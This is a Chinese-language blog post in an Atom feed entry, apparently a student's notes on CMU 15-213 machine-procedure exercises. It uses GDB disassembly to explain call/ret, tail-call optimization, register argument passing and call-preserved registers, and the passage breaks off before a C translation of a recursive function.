        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/"/>
        <content type="html">&lt;h2 id=&#34;activity-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#activity-1&#34;&gt;#&lt;/a&gt; Activity 1&lt;/h2&gt;
&lt;p&gt;输入 &lt;code&gt;gdb --args ./calls&lt;/code&gt; ，输入 &lt;code&gt;r&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  (gdb) r
If you didn&#39;t run it that way, it will now crash.
Otherwise, you will get the (gdb) prompt back.

Type &#39;c&#39; (short for &#39;continue&#39;) at the (gdb) prompt.

Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/calls.c:148
148     machine-procedures/calls.c: No such file or directory.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入两次 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

showStack has been called again. Let&#39;s look at the contents
of the stack right now (just before the pop is executed):
(gdb) x/2gx $rsp

(Recall that the &#39;x&#39; command prints memory. The &#39;/2gx&#39; modifier
tells it to print two &#39;g&#39;iant (64-bit) values in he&#39;x&#39;adecimal,
and &#39;$rsp&#39; means to start at the current value of the %rsp
register, i.e. the stack pointer.)

Answer Problem 1 now: fill in the blanks with the value of the stack pointer
and the contents of the stack. When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
0x00000000004011e1 in showStack ()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;x/2gx $rsp&lt;/code&gt; ，得到如下信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/2gx $rsp
0x7fffffffdde0: 0x0000000000015213      0x000000000040117a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时 &lt;code&gt;$rsp = (void *) 0x7fffffffdde0&lt;/code&gt; ，其指向的地址的值如上图所示。打印 &lt;code&gt;0x000000000040117a&lt;/code&gt;  处的值，可以看到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/2gx 0x000000000040117a
0x40117a &amp;lt;main+48&amp;gt;:     0xe37e02fb8301c383      0xfea4e800402108bf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;gdb&lt;/code&gt;  显示这里是 &lt;code&gt;&amp;lt;main + 48&amp;gt;&lt;/code&gt; ，那么我们对 &lt;code&gt;main&lt;/code&gt;  函数进行反汇编：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble main
Dump of assembler code for function main:
   0x000000000040114a &amp;lt;+0&amp;gt;:     push   %rbx
   0x000000000040114b &amp;lt;+1&amp;gt;:     mov    (%rsi),%rsi
   0x000000000040114e &amp;lt;+4&amp;gt;:     mov    $0x402010,%edi
   0x0000000000401153 &amp;lt;+9&amp;gt;:     mov    $0x0,%eax
   0x0000000000401158 &amp;lt;+14&amp;gt;:    callq  0x401040 &amp;lt;printf@plt&amp;gt;
   0x000000000040115d &amp;lt;+19&amp;gt;:    int3
   0x000000000040115e &amp;lt;+20&amp;gt;:    mov    $0x0,%ebx
   0x0000000000401163 &amp;lt;+25&amp;gt;:    jmp    0x40117d &amp;lt;main+51&amp;gt;
   0x0000000000401165 &amp;lt;+27&amp;gt;:    movslq %ebx,%rax
   0x0000000000401168 &amp;lt;+30&amp;gt;:    mov    0x402e60(,%rax,8),%rdi
   0x0000000000401170 &amp;lt;+38&amp;gt;:    callq  0x401030 &amp;lt;puts@plt&amp;gt;
   0x0000000000401175 &amp;lt;+43&amp;gt;:    callq  0x4011db &amp;lt;showStack&amp;gt;
   0x000000000040117a &amp;lt;+48&amp;gt;:    add    $0x1,%ebx
   0x000000000040117d &amp;lt;+51&amp;gt;:    cmp    $0x2,%ebx
   0x0000000000401180 &amp;lt;+54&amp;gt;:    jle    0x401165 &amp;lt;main+27&amp;gt;
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--
   0x0000000000401182 &amp;lt;+56&amp;gt;:    mov    $0x402108,%edi
   0x0000000000401187 &amp;lt;+61&amp;gt;:    callq  0x401030 &amp;lt;puts@plt&amp;gt;
   0x000000000040118c &amp;lt;+66&amp;gt;:    int3
   0x000000000040118d &amp;lt;+67&amp;gt;:    mov    $0x402270,%edi
   0x0000000000401192 &amp;lt;+72&amp;gt;:    callq  0x401030 &amp;lt;puts@plt&amp;gt;
   0x0000000000401197 &amp;lt;+77&amp;gt;:    int3
   0x0000000000401198 &amp;lt;+78&amp;gt;:    mov    $0x402478,%edi
   0x000000000040119d &amp;lt;+83&amp;gt;:    callq  0x401030 &amp;lt;puts@plt&amp;gt;
   0x00000000004011a2 &amp;lt;+88&amp;gt;:    mov    $0x0,%eax
   0x00000000004011a7 &amp;lt;+93&amp;gt;:    pop    %rbx
   0x00000000004011a8 &amp;lt;+94&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到这个值是 &lt;code&gt;callq  0x4011db &amp;lt;showStack&amp;gt;&lt;/code&gt;  的下一条指令地址，也就是 &lt;code&gt;callq&lt;/code&gt;  调用的返回地址。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt;  继续，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

showStack has been called a third time. Now let&#39;s watch it return.
GDB provides many commands for advancing through the program
other than &#39;c&#39;ontinue. The &#39;si&#39; command, for instance,
executes a single assembly instruction.

Use this command twice now.
After each step, print the values of %rsp and %rip:

(gdb) si
(gdb) p $rsp
(gdb) p $rip

Based on how %rsp and %rip changed after each instruction,
answer Problems 2 and 3 now. When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;si&lt;/code&gt; ， &lt;code&gt;%rsp&lt;/code&gt;  和 &lt;code&gt;%rip&lt;/code&gt;  的值如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p $rsp
$1 = (void *) 0x7fffffffdde8
(gdb) p $rip
$2 = (void (*)()) 0x4011e2 &amp;lt;showStack+7&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;showStack&lt;/code&gt;  函数进行反汇编可以看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble showStack
Dump of assembler code for function showStack:
   0x00000000004011db &amp;lt;+0&amp;gt;:     pushq  $0x15213
   0x00000000004011e0 &amp;lt;+5&amp;gt;:     int3
   0x00000000004011e1 &amp;lt;+6&amp;gt;:     pop    %rax
=&amp;gt; 0x00000000004011e2 &amp;lt;+7&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里 &lt;code&gt;%rip&lt;/code&gt;  指向的是 &lt;code&gt;retq&lt;/code&gt;  指令，再次打印 &lt;code&gt;%rsp&lt;/code&gt;  和 &lt;code&gt;%rip&lt;/code&gt;  的值可以看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p $rsp
$3 = (void *) 0x7fffffffddf0
(gdb) p $rip
$4 = (void (*)()) 0x40117a &amp;lt;main+48&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里 &lt;code&gt;%rsp&lt;/code&gt;  的值相对于 &lt;code&gt;retq&lt;/code&gt;  前 + 8，并且 &lt;code&gt;$rip&lt;/code&gt;  的值等于下一条指令的地址。由此可以推断，此处 &lt;code&gt;ret&lt;/code&gt;  指令将栈顶的地址弹出，并赋值给 &lt;code&gt;%rip&lt;/code&gt; 。那么 &lt;code&gt;callq&lt;/code&gt;  指令做的事就是将下一条指令的地址压栈，然后将 &lt;code&gt;%rip&lt;/code&gt;  的值设置为 &lt;code&gt;callq&lt;/code&gt;  的目标地址。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt;  继续，指令如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

As you&#39;ve seen, a ret pops a 64-bit address off the
top of the stack and jumps to that location.

Now disassemble the function returnOne. It calls another function, abs.
Based on what you see, and your knowledge of the ret instruction,
answer Problem 4 now. When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/calls.c:156
156     in machine-procedures/calls.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;returnOne&lt;/code&gt;  进行反汇编可以看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble returnOne
Dump of assembler code for function returnOne:
   0x00000000004011e7 &amp;lt;+0&amp;gt;:     mov    $0xffffffff,%edi
   0x00000000004011ec &amp;lt;+5&amp;gt;:     callq  0x401142 &amp;lt;abs&amp;gt;
   0x00000000004011f1 &amp;lt;+10&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;returnOneOpt&lt;/code&gt;  进行反汇编即可看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble returnOneOpt
Dump of assembler code for function returnOneOpt:
   0x00000000004011f2 &amp;lt;+0&amp;gt;:     mov    $0xffffffff,%edi
   0x00000000004011f7 &amp;lt;+5&amp;gt;:     jmpq   0x401142 &amp;lt;abs&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 &lt;code&gt;abs&lt;/code&gt;  反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble abs
Dump of assembler code for function abs:
   0x0000000000401142 &amp;lt;+0&amp;gt;:     mov    %edi,%eax
   0x0000000000401144 &amp;lt;+2&amp;gt;:     cltd
   0x0000000000401145 &amp;lt;+3&amp;gt;:     xor    %edx,%eax
   0x0000000000401147 &amp;lt;+5&amp;gt;:     sub    %edx,%eax
   0x0000000000401149 &amp;lt;+7&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;returnOne&lt;/code&gt;  中的过程是，先 &lt;code&gt;callq  0x401142 &amp;lt;abs&amp;gt;&lt;/code&gt; ，然后 &lt;code&gt;retq&lt;/code&gt; 。 &lt;code&gt;returnOneOpt&lt;/code&gt;  改为直接 &lt;code&gt;jmpq   0x401142 &amp;lt;abs&amp;gt;&lt;/code&gt; 。而 &lt;code&gt;abs&lt;/code&gt;  执行完后直接 &lt;code&gt;retq&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;对 &lt;code&gt;returnOne&lt;/code&gt; ，其过程为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将 main 函数中下一条指令地址压栈，将 &lt;code&gt;returnOne&lt;/code&gt;  地址赋给 &lt;code&gt;%rip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行一段，调用 &lt;code&gt;abs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;returnOne&lt;/code&gt;  中下一条指令地址压栈，把 &lt;code&gt;abs&lt;/code&gt;  地址付给 &lt;code&gt;%rip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行一段，从 &lt;code&gt;abs&lt;/code&gt;  返回（执行 &lt;code&gt;abs&lt;/code&gt;  的 &lt;code&gt;retq&lt;/code&gt; ），从栈中弹出 &lt;code&gt;returnOne&lt;/code&gt;  中 &lt;code&gt;retq&lt;/code&gt;  地址赋给 &lt;code&gt;$rip&lt;/code&gt; ， &lt;code&gt;$rip&lt;/code&gt;  跳转到 &lt;code&gt;returnOne&lt;/code&gt;  的 &lt;code&gt;retq&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;执行 &lt;code&gt;returnOne&lt;/code&gt;  的 &lt;code&gt;retq&lt;/code&gt; ，将栈顶返回地址弹出，赋给 &lt;code&gt;$rip&lt;/code&gt; 。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对 &lt;code&gt;returnOneOpt&lt;/code&gt; ，其过程为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将 main 函数中下一条指令地址压栈，将 &lt;code&gt;returnOne&lt;/code&gt;  地址赋给 &lt;code&gt;%rip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行一段，跳转到 &lt;code&gt;abs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;returnOne&lt;/code&gt;  中下一条指令地址压栈，把 &lt;code&gt;abs&lt;/code&gt;  地址付给 &lt;code&gt;%rip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行一段，从 &lt;code&gt;abs&lt;/code&gt;  返回（执行 &lt;code&gt;abs&lt;/code&gt;  的 &lt;code&gt;retq&lt;/code&gt; ），从栈中弹出 &lt;code&gt;main&lt;/code&gt;  中 &lt;code&gt;retq&lt;/code&gt;  地址赋给 &lt;code&gt;$rip&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以这样进行优化的原因是两条 &lt;code&gt;retq&lt;/code&gt;  指令连在一起，所以没有必要 &lt;code&gt;retq&lt;/code&gt;  两次，将 &lt;code&gt;abs&lt;/code&gt;  和 &lt;code&gt;returnOne&lt;/code&gt;  的过程接在一起构成一个 &lt;code&gt;procedure&lt;/code&gt; ， &lt;code&gt;retq&lt;/code&gt;  一次即可。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，题目中给出了答案：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

The transformation you just witnessed is a simple example of tail-call
optimization. Because a call was the last instruction before a ret,
within a function that doesn&#39;t adjust the stack pointer, the compiler
could skip allocating a stack frame: both the call and the ret could be
replaced with a simple jmp to the called function. That function must
end in its own ret instruction, which will use the return address
pushed by the call to returnOneOpt. This optimization is especially
valuable when applied to recursive functions.

End of Activity 1. This program will now exit.

Use the &#39;q&#39;uit command to leave GDB.

[Inferior 1 (process 68527) exited normally]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原来这里是尾递归优化的精髓啊！明白啦！&lt;/p&gt;
&lt;h2 id=&#34;activity-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#activity-2&#34;&gt;#&lt;/a&gt; Activity 2&lt;/h2&gt;
&lt;p&gt;输入 &lt;code&gt;gdb --args ./locals&lt;/code&gt; ，输入 &lt;code&gt;r&lt;/code&gt; ，再输入 &lt;code&gt;c&lt;/code&gt; ，得到的提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;The stack is also used to pass data between procedures, but nowadays
most function arguments are passed in registers instead.  You have
already seen the first two argument-passing registers (%rdi and %rsi,
in that order) in use.

Dissassemble the function seeArgs.
It calls printf with six arguments.  Arguments 2-6 are labeled for you
in the assembly.
Based on what you see in the disasssembly, answer Problem 6.
Check your answer using:
(gdb) x/s &amp;lt;value passed in %rdi&amp;gt;.

When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/locals.c:156
156     in machine-procedures/locals.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble seeArgs&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble seeArgs
Dump of assembler code for function seeArgs:
   0x0000000000401152 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x0000000000401156 &amp;lt;+4&amp;gt;:     mov    $0x6,%r9d
   0x000000000040115c &amp;lt;+10&amp;gt;:    mov    $0x5,%r8d
   0x0000000000401162 &amp;lt;+16&amp;gt;:    mov    $0x4,%ecx
   0x0000000000401167 &amp;lt;+21&amp;gt;:    mov    $0x3,%edx
   0x000000000040116c &amp;lt;+26&amp;gt;:    mov    $0x2,%esi
   0x0000000000401171 &amp;lt;+31&amp;gt;:    mov    $0x402016,%edi
   0x0000000000401176 &amp;lt;+36&amp;gt;:    mov    $0x0,%eax
   0x000000000040117b &amp;lt;+41&amp;gt;:    callq  0x401050 &amp;lt;printf@plt&amp;gt;
   0x0000000000401180 &amp;lt;+46&amp;gt;:    add    $0x8,%rsp
   0x0000000000401184 &amp;lt;+50&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一个传入的参数保存在 &lt;code&gt;%edi&lt;/code&gt;  中，其值是 &lt;code&gt;0x402016&lt;/code&gt; 。估摸着是 &lt;code&gt;int&lt;/code&gt;  类型。输入 &lt;code&gt;x/s 0x402016&lt;/code&gt; ，显示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x402016
0x402016:       &amp;quot;%d %d %d %d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;确实是 &lt;code&gt;int&lt;/code&gt;  类型，那么此处猜测 &lt;code&gt;x/s&lt;/code&gt;  是打印从该处开始的字符串。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

Now disassemble the function seeMoreArgs.
It calls printf with eight arguments.
Based on what you see in the disasssembly, answer Problem 7.
When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/locals.c:156
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble seeMoreArgs&lt;/code&gt; ，输出如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble seeMoreArgs
Dump of assembler code for function seeMoreArgs:
   0x0000000000401185 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x0000000000401189 &amp;lt;+4&amp;gt;:     pushq  $0x8
   0x000000000040118b &amp;lt;+6&amp;gt;:     pushq  $0x7
   0x000000000040118d &amp;lt;+8&amp;gt;:     mov    $0x6,%r9d
   0x0000000000401193 &amp;lt;+14&amp;gt;:    mov    $0x5,%r8d
   0x0000000000401199 &amp;lt;+20&amp;gt;:    mov    $0x4,%ecx
   0x000000000040119e &amp;lt;+25&amp;gt;:    mov    $0x3,%edx
   0x00000000004011a3 &amp;lt;+30&amp;gt;:    mov    $0x2,%esi
   0x00000000004011a8 &amp;lt;+35&amp;gt;:    mov    $0x402010,%edi
   0x00000000004011ad &amp;lt;+40&amp;gt;:    mov    $0x0,%eax
   0x00000000004011b2 &amp;lt;+45&amp;gt;:    callq  0x401050 &amp;lt;printf@plt&amp;gt;
   0x00000000004011b7 &amp;lt;+50&amp;gt;:    add    $0x18,%rsp
   0x00000000004011bb &amp;lt;+54&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第 7 个和第 8 个被压在栈上。寄存器只有 6 个，多的就压在栈上。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

The stack can also be used to store local variables.

Now disassemble the function getV.
It contains a local array of 4 ints.
(The compiler has chosen to reserve some extra stack space.)
Based on what you see in the disasssembly, answer Problems 7 and 8.
When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/locals.c:156
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble getV&lt;/code&gt; ，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble getV
Dump of assembler code for function getV:
   0x00000000004011bc &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp
   0x00000000004011c0 &amp;lt;+4&amp;gt;:     movslq %edi,%rsi
   0x00000000004011c3 &amp;lt;+7&amp;gt;:     mov    %rsp,%rdi
   0x00000000004011c6 &amp;lt;+10&amp;gt;:    callq  0x401284 &amp;lt;getValue&amp;gt;
   0x00000000004011cb &amp;lt;+15&amp;gt;:    add    $0x18,%rsp
   0x00000000004011cf &amp;lt;+19&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;getV&lt;/code&gt;  的调用过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;%rsp - 24&lt;/code&gt; ，留出 24 个字节的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%rsi = %edi, %rdi = %rsp&lt;/code&gt; &lt;br&gt;
 将 &lt;code&gt;%rsp&lt;/code&gt;  的位置通过 &lt;code&gt;%rdi&lt;/code&gt;  传入。 &lt;code&gt;%rsp&lt;/code&gt;  指向数组的起始位置。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对 &lt;code&gt;getValue&lt;/code&gt;  进行反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble getValue
Dump of assembler code for function getValue:
   0x0000000000401284 &amp;lt;+0&amp;gt;:     mov    (%rdi,%rsi,4),%eax
   0x0000000000401287 &amp;lt;+3&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt;  继续，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

There are also rules for whether a function is allowed to change
the value in each register--all the registers, not just those
used for arguments.

Each register is either call-preserved or call-clobbered.
When a function returns, all the call-preserved registers must
have the same values that they did when the function was called.
That means, if a function wants to use a call-preserved register,
it must save the old value first, and restore it when it&#39;s done using
the register. (The push and pop instructions are often used for this.)

(More text to follow, &#39;c&#39;ontinue to go on...)


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/locals.c:156
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;继续输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

... The call-clobbered registers, on the other hand, don&#39;t have to be
saved and restored. A function that wants to use them can just use
them, without worrying about whether its callers were using them also.
However, if a function has an important value in a call-clobbered
register, and it needs to call some other function, and then use that
important value afterward, it has to save the value itself!

(Some people use the term &#39;callee-save&#39; instead of &#39;call-preserved&#39;,
and &#39;caller-save&#39; instead of &#39;call-clobbered&#39;. We don&#39;t like those
terms because there&#39;s only one letter of difference between them.)

Disassemble the function mult4 and think about how it is using the registers.
Using what you find, answer Problem 9. When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/locals.c:156
156     in machine-procedures/locals.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本段提示主要讲了 &lt;code&gt;caller saved registers&lt;/code&gt;  的概念。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;caller saved registers&lt;/code&gt;  (我个人觉得更准确的说法是 &lt;code&gt;caller preserver &amp;amp; restore&lt;/code&gt; )，例如下列的过程调用（写的比较粗糙）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;call_echo:
    pushq %rbx
    callq echo&amp;lt;xxxx&amp;gt;
    popq %rbx
    ret

echo:
    %rbx += 1
    call printf&amp;lt;xxxx&amp;gt;
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;echo&lt;/code&gt;  的过程中会修改 &lt;code&gt;%rbx&lt;/code&gt;  的值，那么在对其进行调用前就必须 &lt;code&gt;pushq %rbx&lt;/code&gt; ，并且在调用完后 &lt;code&gt;popq %rbx&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble mult4&lt;/code&gt;  可得如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble mult4
Dump of assembler code for function mult4:
   0x0000000000401250 &amp;lt;+0&amp;gt;:     push   %rbx
   0x0000000000401251 &amp;lt;+1&amp;gt;:     push   %r12
   0x0000000000401253 &amp;lt;+3&amp;gt;:     push   %r13
   0x0000000000401255 &amp;lt;+5&amp;gt;:     mov    %edx,%r12d
   0x0000000000401258 &amp;lt;+8&amp;gt;:     mov    %ecx,%r13d
   0x000000000040125b &amp;lt;+11&amp;gt;:    callq  0x40124a &amp;lt;mult2&amp;gt;
   0x0000000000401260 &amp;lt;+16&amp;gt;:    mov    %r12d,%edi
   0x0000000000401263 &amp;lt;+19&amp;gt;:    mov    %r13d,%esi
   0x0000000000401266 &amp;lt;+22&amp;gt;:    mov    %eax,%ebx
   0x0000000000401268 &amp;lt;+24&amp;gt;:    callq  0x40124a &amp;lt;mult2&amp;gt;
   0x000000000040126d &amp;lt;+29&amp;gt;:    mov    %eax,%edi
   0x000000000040126f &amp;lt;+31&amp;gt;:    mov    %ebx,%esi
   0x0000000000401271 &amp;lt;+33&amp;gt;:    callq  0x40124a &amp;lt;mult2&amp;gt;
   0x0000000000401276 &amp;lt;+38&amp;gt;:    pop    %r13
   0x0000000000401278 &amp;lt;+40&amp;gt;:    pop    %r12
   0x000000000040127a &amp;lt;+42&amp;gt;:    pop    %rbx
   0x000000000040127b &amp;lt;+43&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后 &lt;code&gt;disassemble mult2&lt;/code&gt; ，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble mult2
Dump of assembler code for function mult2:
   0x000000000040124a &amp;lt;+0&amp;gt;:     mov    %edi,%eax
   0x000000000040124c &amp;lt;+2&amp;gt;:     imul   %esi,%eax
   0x000000000040124f &amp;lt;+5&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到 &lt;code&gt;mult2&lt;/code&gt;  函数中主要使用到的是 &lt;code&gt;%edi&lt;/code&gt;  和 &lt;code&gt;%esi&lt;/code&gt;  两个寄存器。返回值在 &lt;code&gt;%eax&lt;/code&gt;  中。在 &lt;code&gt;mult4&lt;/code&gt;  中，压入了 &lt;code&gt;%rbx %r12 %r13&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

For the final step in today&#39;s activity, we will look at recursive
calls. Each recursive invocation of a function has its own space on
the stack, separate from any other call&#39;s space.

Disassemble the function mrec and think about what it does.
Answer Problem 10. When you are finished, &#39;c&#39;ontinue.


Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-procedures/locals.c:156
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;disassemble mrec&lt;/code&gt; ，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble mrec
Dump of assembler code for function mrec:
   0x00000000004011d0 &amp;lt;+0&amp;gt;:     push   %rbx
   0x00000000004011d1 &amp;lt;+1&amp;gt;:     mov    %edi,%ebx
   0x00000000004011d3 &amp;lt;+3&amp;gt;:     cmp    $0x1,%edi
   0x00000000004011d6 &amp;lt;+6&amp;gt;:     je     0x4011e5 &amp;lt;mrec+21&amp;gt;
   0x00000000004011d8 &amp;lt;+8&amp;gt;:     lea    -0x1(%rdi),%edi
   0x00000000004011db &amp;lt;+11&amp;gt;:    callq  0x4011d0 &amp;lt;mrec&amp;gt;
   0x00000000004011e0 &amp;lt;+16&amp;gt;:    imul   %ebx,%eax
   0x00000000004011e3 &amp;lt;+19&amp;gt;:    pop    %rbx
   0x00000000004011e4 &amp;lt;+20&amp;gt;:    retq
   0x00000000004011e5 &amp;lt;+21&amp;gt;:    mov    %edi,%eax
   0x00000000004011e7 &amp;lt;+23&amp;gt;:    jmp    0x4011e3 &amp;lt;mrec+19&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将该函数转化为 C 函数，如下：&lt;/p&gt;
